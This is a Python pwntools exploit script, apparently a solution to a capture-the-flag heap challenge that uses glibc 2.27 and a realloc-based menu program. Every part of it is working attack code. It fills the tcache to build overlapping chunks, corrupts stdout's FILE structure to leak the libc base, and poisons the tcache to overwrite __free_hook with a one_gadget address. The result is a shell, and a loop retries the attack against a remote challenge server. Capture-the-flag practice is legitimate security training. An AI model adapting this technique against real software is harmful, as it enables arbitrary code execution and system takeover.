from pwn import *


libc=ELF('./libc-2.27.so')

def realloc(size,data):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('Size?')
    io.sendline(str(size))
    io.recvuntil('Content?')
    io.send(data)

def free():
    io.recvuntil('>> ')
    io.sendline('2')  

def pwn():
    realloc(0x70,'a')
    realloc(0,'')
    realloc(0x100,'b')
    realloc(0,'')
    realloc(0xa0,'c')
    realloc(0,'')

    realloc(0x100,'b')
    [free() for i in range(7)] #fill tcache
    realloc(0,'') #to unsortbin fd->arena
    realloc(0x70,'a')
    realloc(0x180,'c'*0x78+p64(0x41)+p8(0x60)+p8(0x87))#overlap

    realloc(0,'')
    realloc(0x100,'a')
    realloc(0,'')
    realloc(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))#get _IO_2_1_stdout_
    
    #get_libc
    libc_base=u64(io.recvuntil("\x7f",timeout=0.1)[-6:].ljust(8,'\x00'))-0x3e82a0
    if libc_base == -0x3e82a0:
        exit(-1)
    print(hex(libc_base))
    free_hook=libc_base+libc.sym['__free_hook']
    one_gadget=libc_base + 0x4f322


    io.sendline('666')
    realloc(0x120,'a')
    realloc(0,'')
    realloc(0x130,'a')
    realloc(0,'')
    realloc(0x170,'a')
    realloc(0,'')
    
    realloc(0x130,'a')
    [free() for i in range(7)]
    realloc(0,'')

    realloc(0x120,'a')
    realloc(0x260,'a'*0x128+p64(0x41)+p64(free_hook))
    realloc(0,'')
    realloc(0x130,'a')
    realloc(0,'')
    realloc(0x130,p64(one_gadget))
    io.interactive()


if __name__ == "__main__":
    while True:
        io=remote('node3.buuoj.cn',27869)
        try:
            pwn()
        except:
            io.close()
